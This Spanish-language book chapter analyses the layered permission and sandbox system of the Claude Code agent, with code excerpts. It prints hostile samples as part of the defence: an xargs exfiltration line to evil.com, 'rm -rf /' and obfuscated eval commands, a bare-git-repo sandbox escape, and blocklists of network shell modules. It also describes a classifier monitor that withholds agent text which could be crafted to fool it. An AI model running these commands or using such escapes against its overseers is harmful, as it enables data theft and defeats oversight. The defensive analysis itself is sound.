# Capítulo 10: Seguridad y Modelo de Permisos

## 10.1 Descripción General y Posicionamiento

El modelo de seguridad de Claude Code es el subsistema con mayor volumen de código y mayor complejidad de todo el sistema, abarcando aproximadamente 25.000 líneas de TypeScript. El problema central que resuelve es: **cómo otorgar a un agente de IA la capacidad de ejecutar comandos shell y modificar archivos, al tiempo que se previenen inyecciones de instrucciones maliciosas, filtraciones de datos y daños al sistema**.

A diferencia de los plugins tradicionales de IDE, Claude Code se enfrenta a un modelo de amenazas único: el propio modelo de IA puede ser inducido mediante prompt injection a ejecutar operaciones peligrosas, y los repositorios maliciosos clonados por el usuario pueden construir vectores de ataque a través de nombres de archivos o contenido. El sistema de seguridad debe establecer una capa de verificación de confianza entre la **salida del modelo** y el **sistema operativo**.

Todo el subsistema de seguridad puede resumirse en una fórmula:

```
Decisión final = f(modo de permisos, coincidencia de reglas, análisis AST, validadores de seguridad, validación de rutas, clasificador, Hook, sandbox)
```

No es un filtro de capa única, sino un sistema de defensa en profundidad de **8 capas** (Defense in Depth), donde cada capa es independientemente funcional y se superponen entre sí.

## 10.2 Fundamentos Teóricos

### 10.2.1 Principio de Mínimo Privilegio (Principle of Least Privilege)

Claude Code rechaza por defecto todas las operaciones de escritura: cada llamada a herramienta debe obtener autorización mediante `checkPermissions`. Los modos de permisos van del más estricto (`default`, preguntar en cada ocasión) al más permisivo (`bypassPermissions`), y el usuario elige activamente el nivel de confianza.

### 10.2.2 Modelo de Sandbox (Sandboxing)

Integra `@anthropic-ai/sandbox-runtime`, usando `sandbox-exec` en macOS y `bubblewrap` (bwrap) en Linux, aislando el sistema de archivos y el acceso a la red a nivel del sistema operativo. El sandbox es independiente de las comprobaciones de permisos en la capa de aplicación: incluso si la capa de aplicación comete un error de juicio, la capa del SO sigue bloqueando.

### 10.2.3 Análisis AST en el Dominio de Seguridad

A diferencia del matching tradicional con expresiones regulares, Claude Code usa un análisis AST completo de Bash (implementado en TypeScript puro, compatible con tree-sitter) para comprender la estructura de los comandos. Esta es la piedra angular de la verificación de seguridad: las expresiones regulares no pueden distinguir `echo "rm -rf /"` de `rm -rf /`, pero el AST sí puede.

### 10.2.4 Defensa en Profundidad (Defense in Depth)

Las comprobaciones de seguridad están distribuidas en 8 capas independientes; que cualquiera de ellas intercepte es suficiente para detener una operación peligrosa. Incluso si un atacante elude el análisis AST (por ejemplo, explotando diferenciales del parser), siguen existiendo la validación de rutas, el sandbox y la confirmación del usuario como respaldo.

## 10.3 Arquitectura del Modelo de Permisos

### 10.3.1 Cinco Niveles de Modos de Permiso

Los modos de permiso se definen en `utils/permissions/PermissionMode.ts`. En tiempo de ejecución hay cinco niveles:

| Modo | Comportamiento | Caso de uso |
|---|---|---|
| `default` | Pregunta al usuario en cada llamada a herramienta | Primer uso, entornos de alto riesgo |
| `acceptEdits` | Edición de archivos aprobada automáticamente; los comandos aún requieren confirmación | Desarrollo cotidiano |
| `plan` | Solo genera un plan, no ejecuta | Diseño de arquitectura, revisión de código |
| `auto` | El clasificador LLM decide automáticamente | Desarrolladores de alta confianza |
| `bypassPermissions` | Omite todas las comprobaciones de permisos | Escenarios de confianza total (puede ser deshabilitado por política) |

Las transiciones de modo cuentan con lógica de cambio de estado completa (`permissionSetup.ts:transitionPermissionMode`), que incluye:

- Al entrar en modo `auto`: se eliminan automáticamente las reglas de permisos peligrosas (`stripDangerousPermissionsForAutoMode`)
- Al salir de modo `auto`: se restauran las reglas eliminadas (`restoreDangerousPermissions`)
- El modo `plan` puede contener `auto` de forma anidada (plan + auto-during-plan)

```typescript
// permissionSetup.ts:~580
export function transitionPermissionMode(
  fromMode: string,
  toMode: string,
  context: ToolPermissionContext,
): ToolPermissionContext {
  if (fromMode === toMode) return context
  // ...
  if (toUsesClassifier && !fromUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(true)
    context = stripDangerousPermissionsForAutoMode(context)
  } else if (fromUsesClassifier && !toUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(false)
    context = restoreDangerousPermissions(context)
  }
}
```

### 10.3.2 Sistema de Reglas de Permisos

Las reglas de permisos (Permission Rules) son el núcleo del control granular, almacenadas en configuración multinivel:

```typescript
// permissions.ts:~95
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES, // userSettings, projectSettings, localSettings, flagSettings, policySettings
  'cliArg',
  'command',
  'session',
] as const
```

Cada regla tiene tres dimensiones:
- **Source** (nivel de origen): policySettings > flagSettings > localSettings > projectSettings > userSettings > session
- **Behavior** (comportamiento): `allow` / `deny` / `ask`
- **RuleValue** (patrón de coincidencia): por ejemplo, `Bash(git commit:*)` permite todos los comandos que empiecen con `git commit`

El matching de reglas soporta tres modos:
1. **Coincidencia por herramienta**: `Bash` coincide con todos los comandos Bash
2. **Coincidencia por prefijo**: `Bash(npm run:*)` coincide con comandos que comienzan con `npm run`
3. **Coincidencia exacta**: `Bash(ls -la)` solo coincide con ese comando exacto

### 10.3.3 Flujo Completo de Cascada de Permisos

Una comprobación de permisos para un comando Bash pasa por `bashToolHasPermission` (`bashPermissions.ts`), con el siguiente recorrido completo:

```
1. Comprobación de modo → bypassPermissions aprueba directamente
2. Coincidencia de reglas deny → si hay coincidencia, rechazar
3. Coincidencia de reglas allow → si hay coincidencia, permitir
4. Comprobación de modo de seguridad → manejo especial para acceptEdits, etc.
5. Análisis AST del comando → tree-sitter genera el comando estructurado
6. Cadena de validadores de seguridad → 23 comprobaciones estáticas
7. Validación de solo lectura → lista blanca de comandos + lista blanca de flags
8. Validación de rutas → restricción al directorio de trabajo
9. Clasificador LLM (opcional) → decisión de IA en modo auto
10. Confirmación del usuario → red de seguridad final
```

## 10.4 Seguridad de Comandos Bash — Flujo de Clasificación en Ocho Pasos

### 10.4.1 Análisis AST con Tree-sitter

Esta es la innovación más central de todo el sistema de seguridad. `utils/bash/ast.ts` implementa análisis de comandos bash basado en AST:

```typescript
// ast.ts:~1-20
/**
 * AST-based bash command analysis using tree-sitter.
 *
 * The key design property is FAIL-CLOSED: we never interpret structure we
 * don't understand. If tree-sitter produces a node we haven't explicitly
 * allowlisted, we refuse to extract argv and the caller must ask the user.
 *
 * This is NOT a sandbox. It answers exactly one question: "Can we produce
 * a trustworthy argv[] for each simple command in this string?"
 */
```

Tipos de salida del análisis AST:

```typescript
// ast.ts:~30
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

Diseño clave: **Fail-Closed + Allowlist**. Cualquier tipo de nodo AST que no esté en la lista blanca hace que el comando entero se marque como `too-complex`, requiriendo confirmación del usuario. El conjunto `DANGEROUS_TYPES` define los tipos de nodos peligrosos conocidos:

```typescript
// ast.ts:~190
const DANGEROUS_TYPES = new Set([
  'command_substitution',   // sustitución de comandos $()
  'process_substitution',   // sustitución de procesos <() >()
  'expansion',              // expansión de parámetros
  'subshell',               // subshell
  'for_statement',          // flujo de control
  'if_statement',
  'function_definition',
  'brace_expression',       // expansión de llaves
  // ... 18 tipos en total
])
```

### 10.4.2 Parser Bash en TypeScript Puro

`utils/bash/bashParser.ts` (4.436 líneas) es un parser completo de sintaxis Bash, que produce un AST compatible con el parser WASM de tree-sitter-bash. Parámetros de diseño clave:

```typescript
// bashParser.ts:~28
const PARSE_TIMEOUT_MS = 50    // timeout de 50ms para prevenir entradas maliciosas
const MAX_NODES = 50_000       // límite de nodos para prevenir OOM
```

El parser soporta sintaxis Bash completa, incluyendo heredoc, cadenas ANSI-C y sustitución de procesos. Ante timeout o explosión de nodos, devuelve directamente `null`: fail-closed.

### 10.4.3 Clasificador LLM (Bash Classifier)

Utilizado en modo `auto`. `bashClassifier.ts` mantiene tres grupos de reglas descriptivas:

- **Allow descriptions**: describen qué comandos son seguros (por ejemplo, "operaciones de solo lectura en git")
- **Deny descriptions**: describen qué comandos son peligrosos (por ejemplo, "comandos que descargan y ejecutan código")
- **Ask descriptions**: patrones que requieren confirmación del usuario

El clasificador usa `sideQuery` para llamar a una instancia de Claude independiente para tomar la decisión, completamente aislada de la conversación principal.

### 10.4.4 Filtrado de Variables de Entorno

`bashPermissions.ts` define dos grupos de listas blancas de variables de entorno seguras:

```typescript
// bashPermissions.ts:~390
const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', 'LANG', 'TZ',
  'NO_COLOR', 'FORCE_COLOR', // ... ~40 en total
])
```

**Los comentarios de seguridad son especialmente valiosos**: el código fuente indica explícitamente qué variables **nunca deben** añadirse a la lista blanca:

```typescript
// bashPermissions.ts:~385 (comentario)
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH (module loading)
// - NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

### 10.4.5 23 Validadores de Seguridad Shell

`bashSecurity.ts` implementa 23 validadores independientes, cada uno con un ID numérico único:

```typescript
// bashSecurity.ts:~76
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

Algunos validadores destacados:

**Detección de sustitución de comandos**: no solo detecta `$()`, sino que también cubre superficies de ataque específicas de Zsh:

```typescript
// bashSecurity.ts:~16
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  // ... incluye también defensa contra sintaxis de comentarios PowerShell
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]
```

**Bloqueo de comandos peligrosos en Zsh**: `zmodload` es el punto de entrada del sistema de módulos Zsh, que puede cargar `zsh/system` (E/S de archivos), `zsh/net/tcp` (comunicación de red) y otros módulos:

```typescript
// bashSecurity.ts:~44
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // punto de entrada de carga de módulos
  'emulate',    // el flag -c es equivalente a eval
  'sysopen', 'sysread', 'syswrite',  // módulo zsh/system
  'zpty',       // ejecución de comandos en pseudoterminal
  'ztcp',       // comunicación de red TCP
  'zf_rm', 'zf_mv', 'zf_chmod',     // comandos integrados zsh/files
  // ...
])
```

### 10.4.6 Mecanismo de Validación de Solo Lectura

`readOnlyValidation.ts` mantiene un sistema de **lista blanca de comandos + lista blanca de flags**. Con `COMMAND_ALLOWLIST` como núcleo:

```typescript
// readOnlyValidation.ts:~55
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: { '-I': '{}', '-n': 'number', '-P': 'number', ... },
    // nota: -i y -e eliminados por diferencias semánticas en GNU getopt optional-arg
  },
  grep: { safeFlags: { '-e': 'string', '-i': 'none', ... } },
  sort: { safeFlags: { '-r': 'none', '-n': 'none', ... } },
  tree: { safeFlags: { ... } },  // -R eliminado: tree -R -H escribe archivos
  date: { safeFlags: { ... }, additionalCommandIsDangerousCallback: ... },
  // ... ~30 comandos en total
}
```

Cada lista blanca de flags por comando tiene comentarios de seguridad detallados. Por ejemplo, el flag `-i` de `xargs` fue eliminado:

```typescript
// readOnlyValidation.ts:~130 (comentario)
// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
// flag takes NO arg and `X` becomes the next positional (target command).
//
// `-i` (`i::` — optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
```

Este nivel de análisis de seguridad —comprender las diferencias semánticas en el manejo de `optional-arg` de GNU getopt que llevan a diferenciales del parser— es la parte más impresionante de todo el modelo de seguridad.

### 10.4.7 Validación de Rutas y Protección contra Path Traversal

`pathValidation.ts` (1.303 líneas) implementa un sistema completo de seguridad de rutas:

**Extractores de rutas**: define parsers de argumentos especializados para 34 comandos:

```typescript
// pathValidation.ts:~170
export const PATH_EXTRACTORS: Record<PathCommand, (args: string[]) => string[]> = {
  cd: args => (args.length === 0 ? [homedir()] : [args.join(' ')]),
  find: args => { /* lógica compleja de separación flag/ruta */ },
  grep: args => parsePatternCommand(args, flags),
  git: args => { /* manejo especial de git diff --no-index */ },
  // ... 34 comandos en total
}
```

**Manejo de POSIX `--`**: gestiona correctamente el separador end-of-options, previniendo que argumentos tipo `-path` eludan la validación de rutas:

```typescript
// pathValidation.ts:~105
// SECURITY: `rm -- -/../.claude/settings.local.json`
// Aquí `-/../.claude/settings.local.json` comienza con `-`,
// si no se maneja `--`, un filtro ingenuo de !arg.startsWith('-') lo descartaría,
// haciendo que el validador vea 0 rutas, devuelva passthrough, y el archivo sea eliminado.
function filterOutFlags(args: string[]): string[] {
  const result: string[] = []
  let afterDoubleDash = false
  for (const arg of args) {
    if (afterDoubleDash) { result.push(arg) }
    else if (arg === '--') { afterDoubleDash = true }
    else if (!arg?.startsWith('-')) { result.push(arg) }
  }
  return result
}
```

**Protección de rutas de eliminación peligrosas**: incluso con reglas de allowlist, las operaciones `rm` en rutas críticas como `/`, `/etc`, `/home` siempre requieren confirmación del usuario:

```typescript
// pathValidation.ts:~70
function checkDangerousRemovalPaths(
  command: 'rm' | 'rmdir', args: string[], cwd: string
): PermissionResult {
  for (const path of paths) {
    if (isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous ${command} operation...` }
    }
  }
}
```

**Protección contra ataques combinados cd + escritura**:

```typescript
// pathValidation.ts:~490
// SECURITY: Block write operations in compound commands containing 'cd'
// Example attack: cd .claude/ && mv test.txt settings.json
// This would bypass the check for .claude/settings.json because paths
// are resolved relative to the original CWD.
if (compoundCommandHasCd && operationType !== 'read') {
  return { behavior: 'ask', message: '...' }
}
```

## 10.5 Cadena de Validación de FileEdit

La cadena de validación de FileEditTool se implementa en el método `validateInput` de `FileEditTool.ts`, con 12 pasos:

| Paso | Verificación | Ubicación en código |
|---|---|---|
| 1 | Detección de secretos en Team Memory | `checkTeamMemSecrets(fullFilePath, new_string)` |
| 2 | Comprobación de que old_string === new_string (sin cambios) | errorCode: 1 |
| 3 | Coincidencia de reglas Deny | `matchingRuleForInput(..., 'deny')` |
| 4 | Comprobación de seguridad de rutas UNC (prevención de filtración NTLM) | `fullFilePath.startsWith('\\\\')` |
| 5 | Límite de tamaño de archivo (1 GiB) | `MAX_EDIT_FILE_SIZE` |
| 6 | Detección de codificación y lectura del archivo | UTF-8 / UTF-16LE |
| 7 | Verificación de existencia del archivo | old_string debe estar vacío si no existe |
| 8 | Interceptación de Jupyter Notebook | redirige al uso de NotebookEditTool |
| 9 | **Comprobación Must-Read-Before-Write** | `readFileState.get(fullFilePath)` |
| 10 | **Detección de modificación concurrente por mtime** | `lastWriteTime > readTimestamp.timestamp` |
| 11 | **Comprobación de unicidad** | exige `replace_all: true` cuando hay múltiples coincidencias |
| 12 | Validación especial de archivos de configuración | `validateInputForSettingsFileEdit` |

Los pasos 9 y 10 conforman el invariante **"leer antes de escribir"**:

```typescript
// FileEditTool.ts:~250
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
if (!readTimestamp || readTimestamp.isPartialView) {
  return {
    result: false, behavior: 'ask',
    message: 'File has not been read yet. Read it first before writing to it.',
  }
}
// ...
const lastWriteTime = getFileModificationTime(fullFilePath)
if (lastWriteTime > readTimestamp.timestamp) {
  // Manejo especial en Windows: la sincronización en la nube/antivirus puede cambiar mtime sin cambiar contenido
  if (isFullRead && fileContent === readTimestamp.content) {
    // contenido sin cambios, aprobado de forma segura
  } else {
    return { result: false, message: 'File has been modified since read...' }
  }
}
```

## 10.6 Mecanismo de Sandbox

### 10.6.1 Arquitectura del Adaptador de Sandbox

`utils/sandbox/sandbox-adapter.ts` (985 líneas) es la capa de adaptación de `@anthropic-ai/sandbox-runtime`, que mapea el sistema de configuración de Claude Code a la configuración del runtime del sandbox:

```typescript
// sandbox-adapter.ts:~160
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []
  
  // siempre rechazar escritura en archivos de configuración — previene escapes del sandbox
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())
  
  // rechazar escritura en .claude/skills — mismo nivel de privilegio
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
  
  // protección contra ataques de repositorio Git desnudo
  for (const gitFile of ['HEAD', 'objects', 'refs', 'hooks', 'config']) {
    const p = resolve(dir, gitFile)
    try { statSync(p); denyWrite.push(p) }
    catch { bareGitRepoScrubPaths.push(p) }
  }
}
```

### 10.6.2 Protección contra Ataques de Repositorio Git Desnudo

Esta es una medida de seguridad ingeniosa. Un atacante puede plantar los archivos `HEAD`, `objects/`, `refs/` en el cwd, haciendo que `is_git_directory()` de Git confunda el cwd con un repositorio desnudo, y luego ejecutar código arbitrario mediante la configuración `core.fsmonitor`:

```typescript
// sandbox-adapter.ts:~245
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.

// Estrategia: archivos existentes se configuran como enlace solo lectura, archivos inexistentes se limpian tras la ejecución del comando
function scrubBareGitRepoFiles(): void {
  for (const p of bareGitRepoScrubPaths) {
    try { rmSync(p, { recursive: true }) }
    catch { /* ENOENT es normal */ }
  }
}
```

### 10.6.3 Estrategia de Aislamiento de Red

El sandbox soporta control de red a nivel de dominio, extrayendo los dominios permitidos de las reglas de permisos de la herramienta WebFetch:

```typescript
// sandbox-adapter.ts:~190
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === WEB_FETCH_TOOL_NAME && 
      rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}
```

Las políticas empresariales pueden forzar mediante `allowManagedDomainsOnly` el uso exclusivo de dominios configurados por el administrador.

## 10.7 Sistema de Hooks e Interacción con Permisos

### 10.7.1 Hook PreToolUse / PostToolUse

El sistema de hooks permite a los usuarios inyectar lógica de seguridad personalizada. `interactiveHandler.ts` muestra cómo los hooks compiten con las decisiones de permisos:

```typescript
// interactiveHandler.ts:~68
// Competencia cuádruple: interacción del usuario / Hook / clasificador / Bridge(CCR)
// Se usa claim() como operación atómica para garantizar un único ganador
void (async () => {
  if (isResolved()) return
  const hookDecision = await ctx.runHooks(
    currentAppState.toolPermissionContext.mode,
    result.suggestions,
    result.updatedInput,
    permissionPromptStartTimeMs,
  )
  if (!hookDecision || !claim()) return
  ctx.removeFromQueue()
  resolveOnce(hookDecision)
})()
```

### 10.7.2 Modelo de Competencia Concurrente en la Decisión de Permisos

`PermissionContext.ts` define `createResolveOnce`: un patrón "claim-then-resolve" que garantiza que solo un ganador prevalezca cuando múltiples fuentes asíncronas (UI de usuario, Hook, clasificador, Bridge, Channel) compiten:

```typescript
// PermissionContext.ts:~80
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  let delivered = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value: T) {
      if (delivered) return
      delivered = true; claimed = true
      resolve(value)
    },
  }
}
```

Este diseño soporta competencia concurrente de seis fuentes:
1. **UI local**: el usuario hace clic en Allow/Deny en el terminal
2. **Hook**: el hook PreToolUse devuelve una decisión
3. **Bash Classifier**: el clasificador LLM juzga seguridad
4. **Bridge (CCR)**: decisión remota desde la interfaz web de Claude.ai
5. **Channel**: respuesta desde Telegram/iMessage u otros canales
6. **Recheck**: recomprobación automática tras cambio de reglas

## 10.8 Clasificador YOLO (Clasificador de Modo Auto)

### 10.8.1 Arquitectura

`yoloClassifier.ts` (1.495 líneas) implementa el clasificador de seguridad de IA para el modo `auto`. Es una instancia de Claude independiente, llamada mediante `sideQuery`, completamente aislada de la conversación principal:

```typescript
// yoloClassifier.ts:~400
const YOLO_CLASSIFIER_TOOL_SCHEMA: BetaToolUnion = {
  type: 'custom',
  name: 'classify_result',
  input_schema: {
    type: 'object',
    properties: {
      thinking: { type: 'string' },
      shouldBlock: { type: 'boolean' },
      reason: { type: 'string' },
    },
  },
}
```

### 10.8.2 Clasificador XML de Dos Fases

El clasificador soporta tres modos de operación (`both` / `fast` / `thinking`), usando por defecto una estrategia de dos fases:

- **Fase 1 (fast)**: max_tokens=64, nudge para dar una decisión inmediata sí/no. Si se juzga seguro, se devuelve directamente.
- **Fase 2 (thinking)**: solo se activa cuando la Fase 1 juzga "bloquear", usa razonamiento chain-of-thought para reducir falsos positivos.

```typescript
// yoloClassifier.ts:~680
const XML_S1_SUFFIX = '\nErr on the side of blocking. <block> immediately.'
const XML_S2_SUFFIX = '\nReview the classification process and follow it carefully...'
```

### 10.8.3 Compresión del Transcript

El clasificador no recibe el historial completo de la conversación, sino que comprime la conversación en un formato compacto mediante `buildTranscriptEntries`: solo conserva el texto del usuario y los bloques `tool_use` del asistente (excluyendo el texto del asistente, ya que podría estar elaborado para influir al clasificador):

```typescript
// yoloClassifier.ts:~480
// Only include tool_use blocks — assistant text is model-authored
// and could be crafted to influence the classifier's decision.
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

### 10.8.4 Optimización Fast-Path

Antes de llamar al clasificador, hay tres fast-paths que pueden evitar la llamada al LLM:

1. **Simulación de acceptEdits**: si el comando se aprobaría automáticamente en modo `acceptEdits`, aprobarlo directamente
2. **Lista blanca de herramientas seguras**: `isAutoModeAllowlistedTool` mantiene un conjunto de herramientas conocidas como seguras
3. **Seguimiento de denegaciones**: cuando hay demasiadas denegaciones consecutivas, volver a preguntar directamente al usuario

### 10.8.5 Eliminación de Permisos Peligrosos

Al entrar en modo `auto`, las siguientes reglas de permisos se eliminan automáticamente (`stripDangerousPermissionsForAutoMode`):

```typescript
// permissionSetup.ts:~100
export function isDangerousBashPermission(toolName: string, ruleContent: string | undefined): boolean {
  // Bash(*) — permite todos los comandos
  if (ruleContent === undefined || ruleContent === '') return true
  // python:*, node:*, bash:* — intérpretes de scripts
  for (const pattern of DANGEROUS_BASH_PATTERNS) {
    if (content === `${lowerPattern}:*`) return true
    // ...
  }
}
```

Esto garantiza que incluso si el usuario guardó anteriormente una regla amplia como `Bash(python:*)`, esta no eluda al clasificador en modo `auto`.

## 10.9 Análisis de Decisiones de Diseño

### 10.9.1 Por Qué AST en Lugar de Expresiones Regulares

Las expresiones regulares no pueden manejar ataques de **parser differential**. Por ejemplo:

```bash
echo "rm -rf /"   # la regex daría un falso positivo — esto es solo un argumento de echo
rm -rf /           # la regex debería reportar este
```

Más peligrosos son el **anidamiento de comillas** y la **expansión de shell**:

```bash
ev"al" 'rm -rf /'    # la regex podría no ver eval
$'\x65\x76\x61\x6c' 'rm -rf /'  # eval codificado como cadena ANSI-C
```

El parser AST comprende la estructura sintáctica y puede distinguir correctamente nombres de comandos de argumentos. Y el diseño fail-closed significa que cualquier estructura que no pueda parsearse requiere confirmación del usuario.

### 10.9.2 Cuándo y con Qué Tradeoffs Introducir el Clasificador LLM

El clasificador solo se usa en modo `auto`, con un estricto control de costes:

- **Latencia**: diseño de dos fases, la Fase 1 generalmente tarda <100ms (max_tokens=64 + caché de prompts)
- **Coste**: usa `sideQuery` en una llamada API independiente, no contabilizado en los tokens de la conversación principal
- **Precisión**: el chain-of-thought de la Fase 2 reduce los falsos positivos a un nivel razonable
- **Fiabilidad**: cuando el clasificador no está disponible, fail-closed (vuelve a preguntar al usuario)

### 10.9.3 El Equilibrio entre Seguridad y Usabilidad

Claude Code equilibra ambos mediante **confianza progresiva** (progressive trust):

1. Primer uso: cada comando requiere confirmación
2. Después de guardar reglas: los comandos coincidentes se aprueban automáticamente
3. Modo `acceptEdits`: las ediciones de archivos se aprueban automáticamente
4. Modo `auto`: el clasificador de IA decide
5. `bypassPermissions`: confianza total

Al mismo tiempo, a través de **sugerencias inteligentes** (`suggestionForExactCommand` / `suggestionForPrefix`), se guía al usuario para que establezca gradualmente reglas de confianza, en lugar de hacerlo de golpe.

### 10.9.4 Comparación con Modelos de Seguridad de la Competencia

| Dimensión | Claude Code | Cursor | GitHub Copilot |
|---|---|---|---|
| Análisis de comandos | Análisis AST + 23 validadores | Regex básico | No ejecuta comandos |
| Sandbox | Nivel OS (sandbox-exec/bwrap) | Ninguno | N/A |
| Modelo de permisos | 5 niveles + reglas granulares | Binario (permitir/denegar) | N/A |
| Clasificador IA | Instancia LLM independiente | Ninguno | Ninguno |
| Validación de rutas | Parsers especializados para 34 comandos | Comprobación básica | N/A |
| Política empresarial | Capa policySettings | Limitada | Política organizativa |

## 10.10 Patrones Transferibles

1. **Patrón Fail-Closed Allowlist**: el principio central del análisis AST: solo comprender estructuras conocidas como seguras, rechazar el resto. Aplicable a cualquier escenario que requiera parsear entradas no confiables.

2. **Patrón de Concurrencia Claim-then-Resolve**: `createResolveOnce` resuelve el problema de competencia por la decisión entre múltiples fuentes asíncronas. Reutilizable en cualquier escenario que necesite "gana el primer árbitro que llegue".

3. **Escalada progresiva de confianza**: comenzar desde el modo más estricto y construir gradualmente reglas de confianza a través del comportamiento del usuario. Más acorde a la psicología humana que "elegir el nivel de confianza desde el principio".

4. **Clasificador Fast-Path + dos fases**: primero usar reglas/listas blancas/simulación para saltar las operaciones obviamente seguras, llamar al LLM solo para las dudosas. La estrategia de dos fases (fast + thinking) alcanza el equilibrio entre latencia y precisión.

5. **Defensa contra Parser Differential**: no solo usar el propio parser, sino también verificar sistemáticamente las diferencias entre características de shell (GNU vs BSD getopt, reglas de expansión de Zsh vs Bash). Esta mentalidad es transferible a cualquier sistema que involucre múltiples capas de intérpretes.

6. **Jerarquía de niveles de origen en reglas de permisos**: fusión de configuración multinivel (policy > flag > local > project > user > session), la política empresarial siempre gana. Un modelo general de prioridad de configuración.

7. **Sandbox + doble seguro en capa de aplicación**: incluso si se elude la comprobación de permisos en la capa de aplicación, el sandbox del OS sigue bloqueando, y viceversa. Dos fallos independientes.

## 10.11 Índice de Código Fuente

| Archivo | Líneas | Funcionalidad principal |
|---|---|---|
| `tools/BashTool/bashPermissions.ts` | 2.621 | Punto de entrada principal de decisiones de permisos Bash, matching de reglas, extracción de prefijos de comandos |
| `tools/BashTool/bashSecurity.ts` | 2.592 | 23 validadores de seguridad, análisis de comillas, detección de sustitución de comandos |
| `tools/BashTool/readOnlyValidation.ts` | 1.990 | Lista blanca de comandos, lista blanca de flags, validación de solo lectura |
| `tools/BashTool/pathValidation.ts` | 1.303 | Extractores de rutas para 34 comandos, detección de rutas peligrosas |
| `tools/BashTool/BashTool.tsx` | 1.143 | Punto de entrada de la herramienta Bash, schema de entrada, lógica de ejecución |
| `tools/BashTool/prompt.ts` | 369 | Prompt de la herramienta Bash, descripción del sandbox |
| `tools/FileEditTool/FileEditTool.ts` | ~400 | Cadena de validación de 12 pasos para edición de archivos |
| `utils/permissions/permissions.ts` | 1.486 | Punto de entrada principal de decisiones de permisos, matching de reglas, integración de modo auto |
| `utils/permissions/permissionSetup.ts` | 1.532 | Configuración de modos de permisos, detección y eliminación de reglas peligrosas |
| `utils/permissions/yoloClassifier.ts` | 1.495 | Clasificador LLM para modo auto, protocolo XML de dos fases |
| `utils/permissions/filesystem.ts` | 1.777 | Permisos del sistema de archivos, seguridad de rutas, protección de configuración de Claude |
| `utils/bash/ast.ts` | 2.679 | Análisis AST de Bash, traversal de nodos con allowlist |
| `utils/bash/bashParser.ts` | 4.436 | Parser Bash en TypeScript puro |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 536 | Manejo interactivo de permisos, modelo de competencia de seis vías |
| `hooks/toolPermission/PermissionContext.ts` | 388 | Contexto de permisos, claim-then-resolve |
| `utils/sandbox/sandbox-adapter.ts` | 985 | Adaptación de configuración del sandbox, protección contra repositorio Git desnudo |

---

*Este capítulo se basa en el snapshot del código fuente TypeScript de Claude Code (2026-03-31, ~512K LOC). El código relacionado con seguridad abarca aproximadamente 25.000 líneas en 16 archivos principales. Todos los fragmentos de código se copiaron con precisión de los archivos fuente e incluyen la ubicación anotada.*
